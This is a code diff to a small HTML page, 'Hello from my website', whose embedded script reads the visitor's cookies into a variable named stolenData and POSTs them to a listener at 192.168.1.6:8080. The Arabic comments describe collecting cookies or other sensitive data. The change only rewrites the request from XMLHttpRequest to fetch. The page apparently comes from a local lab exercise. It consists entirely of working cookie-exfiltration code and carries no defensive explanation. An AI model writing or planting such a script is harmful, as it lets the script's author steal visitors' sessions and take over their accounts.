@@ -1,22 +1,30 @@
 <!DOCTYPE html>
-<html>
-    <head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple POST Request</title>
+</head>
+<body>
 
-    </head>
-    <body>
-       <h1>hello in my website</h1>
+<h1>Hello from my website</h1>
 
-      <script>
+<script>
     // جمع الكوكيز أو أي بيانات حساسة
     var stolenData = document.cookie;
 
-    // إنشاء طلب POST لإرسال البيانات إلى الخادم المحلي
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "http://192.168.1.6:8080", true);  // استخدم IP الجهاز والخادم
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr.send("data=" + encodeURIComponent(stolenData));
+    // إرسال طلب POST باستخدام fetch
+    fetch("http://192.168.1.6:8080", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "data=" + encodeURIComponent(stolenData)
+    })
+    .then(response => response.text())
+    .then(data => console.log("Server response: ", data))
+    .catch(error => console.error("Error:", error));
 </script>
 
-
-    </body>
+</body>
 </html>
